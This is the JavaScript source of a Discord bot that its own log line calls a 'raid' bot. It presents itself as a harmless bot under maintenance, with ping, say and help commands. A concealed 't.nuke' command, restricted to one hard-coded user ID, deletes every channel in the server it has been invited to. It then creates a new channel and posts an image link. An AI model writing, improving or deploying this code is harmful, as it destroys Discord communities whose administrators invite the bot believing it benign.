const Discord = require("discord.js");
const client = new Discord.Client();

let prefix = process.env.PREFIX;

client.on("ready", () => {
    console.log(`Iniciando bot raid...`);
    console.log(`Cliente ${client.user.tag} listo`);
    console.log("Pikachu");
    presencia();  
    });

function presencia(){
  client.user.setPresence({
status: "dnd",
activity: {
  name: "En mantenimiento",
  type: "WATCHING"
 
}
  });
}
client.on("message", message => {
  if (message.author.id !== '724423864611766294') 
  return;
   if (message.content === 't.nuke') {
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`#si`, {
          type: 'text'
        }).then(channel => {
          channel.send("https://media.discordapp.net/attachments/839647779580149770/839889412988207104/cropped-1366-768-710940.png?width=842&height=473")
        })
         }
      })

      client.on("message", message => {
        if (message.author.id !== '724423864611766294') return;
         const args = message.content.slice().trim().split(/ +/g );
         const command = args.shift().toLowerCase();
         if (message.content === 't.help') {
     message.channel.send(`En mantenimiento`);
        }
      });
      client.on('message', message => {
        if (!message.content.startsWith(prefix) || !message.guild) return;
        if (message.author.bot) return;
        
        const cont = message.content.split(' ').slice(1);
        const args = cont.join(' ');
    
        if (message.content.startsWith(prefix+'ping')){
            message.channel.send('pong');
    
        } else if (message.content.startsWith(prefix+ 'say')) {
            if (!args) return;
            message.channel.send(args);
        }
    });

    client.login(process.env.TOKEN);